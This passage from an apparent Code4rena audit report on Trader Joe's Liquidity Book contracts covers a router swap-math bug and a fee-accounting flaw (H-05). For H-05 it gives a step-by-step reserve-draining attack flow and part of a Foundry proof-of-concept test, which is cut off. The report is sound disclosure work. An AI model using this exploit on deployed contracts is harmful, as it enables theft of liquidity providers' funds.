<code>amountsIn</code> will be [<code>incorrectAmountIn</code>, <code>userDesireAmount</code>].</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"440\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"441\"></span><span class=\"grvsc-source\"><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getAmountsIn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pairBinSteps</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pairs</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenPath</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amountOut</span><span class=\"mtk1\">);</span></span></span></code></pre>\n</li>\n<li>\n<p>Then it transfers <code>incorrectAmountIn</code> to <code>_pairs[0]</code> to prepare for the swap.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"444\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"445\"></span><span class=\"grvsc-source\"><span class=\"mtk12\">_tokenPath</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pairs</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">], </span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span></code></pre>\n</li>\n<li>\n<p>Finally it calls function <code>_swapTokensForExactToken</code> to execute the swap.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"446\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"447\"></span><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amountOutReal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_swapTokensForExactTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pairs</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pairBinSteps</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenPath</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>In this step it will reach to <a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L841\">line 841</a> which will set the expected <code>amountOut = amountsIn[i+1] = amountsIn[1] = userDesireAmount</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"841\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"842\"></span><span class=\"grvsc-source\"><span class=\"mtk12\">amountOut</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_amountsIn</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<p>So after calling <code>IJoePair(_pair).swap()</code>, the user just gets exactly <code>amountOut</code> and wastes a lot of tokenIn that (s)he transfers to the pool.</p>\n</li>\n</ul>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of concept</h3>\n<p>Here is our test script to describe the impacts</p>\n<ul>\n<li><a href=\"https://gist.github.com/huuducst/6e34a7bdf37bb29f4b84d2faead94dc4\">https://gist.github.com/huuducst/6e34a7bdf37bb29f4b84d2faead94dc4</a></li>\n</ul>\n<p>You can place this file into <code>/test</code> folder and run it using</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test --match-test testBugSwapJoeV1PairWithLBRouter --fork-url https://rpc.ankr.com/avalanche --fork-block-number 21437560 -vv</span></span></code></pre>\n<p>Explanation of test script: (For more detail you can read the comments from test script above)</p>\n<ol>\n<li>Firstly we get the Joe v1 pair WAVAX/USDC from JoeFactory.</li>\n<li>At the forked block, price <code>WAVAX/USDC</code> was around 15.57. We try to use LBRouter function <code>swapTokensForExactTokens</code> to swap <code>10$</code> WAVAX (10e18 wei) to <code>1$</code> USDC (1e6 wei). But it reverts with the error <code>LBRouter__MaxAmountInExceeded</code>. But when we swap directly to JoePair, it swap successfully <code>10$</code> AVAX (10e18 wei) to <code>155$</code> USDC (155e6 wei).</li>\n<li>We use LBRouter function <code>swapTokensForExactTokens</code> again with very large <code>amountInMax</code> to swap <code>1$</code> USDC (1e6 wei). It swaps successfully but needs to pay a very large amount WAVAX (much more than price).</li>\n</ol>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Modify function <code>LBRouter._getAmountsIn</code> as follow</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"728\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"729\"></span><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_binStep</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"730\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_reserveIn</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_reserveOut</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">IJoePair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getReserves</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"731\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_token</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">_tokenPath</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"732\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">_reserveIn</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_reserveOut</span><span class=\"mtk1\">) = (</span><span class=\"mtk12\">_reserveOut</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_reserveIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"733\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"734\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"735\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"736\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountOut_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"737\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Legacy uniswap way of rounding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"738\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Fix here </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"739\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = (</span><span class=\"mtk12\">_reserveIn</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">amountOut_</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1_000</span><span class=\"mtk1\">) / ((</span><span class=\"mtk12\">_reserveOut</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amountOut_</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">997</span><span class=\"mtk1\">) + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"740\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"741\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">], ) = </span><span class=\"mtk11\">getSwapIn</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ILBPair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk11\">ILBPair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">tokenX</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"742\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/400\">0x0Louis (Trader Joe) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/400#issuecomment-1309002772\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, due to an incorrect order of operation, the math for the router will be incorrect.</p>\n<p>While the error could be considered a typo, the router is the designated proper way of performing a swap, and due to this finding, the math will be off.</p>\n<p>Because the impact shows an incorrect logic, and a broken invariant (the router uses incorrect amounts, sometimes reverting, sometimes costing the end user more tokens than necessary), I believe High Severity to be appropriate.</p>\n<p>Mitigation will require refactoring and may be aided by the test case offered in this report.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-05-attacker-can-steal-entire-reserves-by-abusing-fee-calculation\" style=\"position:relative;\"><a href=\"#h-05-attacker-can-steal-entire-reserves-by-abusing-fee-calculation\" aria-label=\"h 05 attacker can steal entire reserves by abusing fee calculation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/423\">[H-05] Attacker can steal entire reserves by abusing fee calculation</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/423\">Trust</a>, also found by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/320\">zzykxx</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L819-L829\">https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L819-L829</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L202\">https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L202</a><br></p>\n<p>Similar to other LP pools, In Trader Joe users can call <code>mint()</code> to provide liquidity and receive LP tokens, and <code>burn()</code> to return their LP tokens in exchange for underlying assets. Users collect fees using <code>collectFess(account,binID)</code>. Fees are implemented using debt model. The fundamental fee calculation is:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _getPendingFees(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Bin memory _bin,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address _account,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _id,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _balance</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) private view returns (uint256 amountX, uint256 amountY) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Debts memory _debts = _accruedDebts[_account][_id];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        amountX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtX;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        amountY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtY;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>accTokenXPerShare / accTokenYPerShare is an ever increasing amount that is updated when swap fees are paid to the current active bin.</p>\n<p>When liquidity is first minted to user, the _accruedDebts is updated to match current _balance * accToken*PerShare. Without this step, user could collect fees for the entire growth of accToken*PerShare from zero to current value. This is done in _updateUserDebts, called by _cacheFees() which is called by _beforeTokenTransfer(), the token transfer hook triggered on mint/burn/transfer.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _updateUserDebts(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Bin memory _bin,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address _account,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _id,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _balance</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) private {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _debtX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _debtY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _accruedDebts[_account][_id].debtX = _debtX;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _accruedDebts[_account][_id].debtY = _debtY;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>The critical problem lies in _beforeTokenTransfer:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (_from != _to) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_from != address(0) &amp;&amp; _from != address(this)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _balanceFrom = balanceOf(_from, _id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _cacheFees(_bin, _from, _id, _balanceFrom, _balanceFrom - _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_to != address(0) &amp;&amp; _to != address(this)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _balanceTo = balanceOf(_to, _id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _cacheFees(_bin, _to, _id, _balanceTo, _balanceTo + _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Note that if _from or _to is the LBPair contract itself, _cacheFees won’t be called on _from or _to respectively. This was presumably done because it is not expected that the LBToken address will receive any fees. It is expected that the LBToken will only hold tokens when user sends LP tokens to burn.</p>\n<p>This is where the bug manifests - the LBToken address (and 0 address), will collect freshly minted LP token’s fees from 0 to current accToken*PerShare value.</p>\n<p>We can exploit this bug to collect the entire reserve assets. The attack flow is:</p>\n<ul>\n<li>Transfer amount X to pair</li>\n<li>Call <code>pair.mint()</code>, with the to address = pair address</li>\n<li>call <code>collectFees()</code> with pair address as account -> pair will send to itself the fees! It is interesting that both OZ ERC20 implementation and LBToken implementation allow this, otherwise this exploit chain would not work</li>\n<li>Pair will now think user sent in money, because the bookkeeping is wrong. _pairInformation.feesX.total is decremented in <code>collectFees()</code>, but the balance did not change. Therefore, this calculation will credit attacker with the fees collected into the pool:</li>\n</ul>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 _amountIn = _swapForY</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ? tokenX.received(_pair.reserveX, _pair.feesX.total)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    : tokenY.received(_pair.reserveY, _pair.feesY.total);</span></span></code></pre>\n<ul>\n<li>Attacker calls <code>swap()</code> and receives reserve assets using the fees collected.</li>\n<li>Attacker calls <code>burn()</code>, passing their own address in _to parameter. This will successfully burn the minted tokens from step 1 and give Attacker their deposited assets.</li>\n</ul>\n<p>Note that if the contract did not have the entire collectFees code in an unchecked block, the loss would be limited to the total fees accrued:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (amountX != 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _pairInformation.feesX.total -= uint128(amountX);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">if (amountY != 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _pairInformation.feesY.total -= uint128(amountY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>If attacker would try to overflow the feesX/feesY totals, the call would revert. Unfortunately, because of the unchecked block feesX/feesY would overflow and therefore there would be no problem for attacker to take the entire reserves.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Attacker can steal the entire reserves of the LBPair.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Paste this test in LBPair.Fees.t.sol:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function testAttackerStealsReserve() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amountY=  53333333333333331968;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amountX = 100000;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amountYInLiquidity = 100e18;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 totalFeesFromGetSwapX;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 totalFeesFromGetSwapY;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        addLiquidity(amountYInLiquidity, ID_ONE, 5, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 id;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (,,id ) = pair.getReservesAndId();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;id before&quot; , id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //swap X -&gt; Y and accrue X fees</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (uint256 amountXInForSwap, uint256 feesXFromGetSwap) = router.getSwapIn(pair, amountY, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        totalFeesFromGetSwapX += feesXFromGetSwap;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        token6D.mint(address(pair), amountXInForSwap);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(ALICE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        pair.swap(true, DEV);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (uint256 feesXTotal, , uint256 feesXProtocol, ) = pair.getGlobalFees();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (,,id 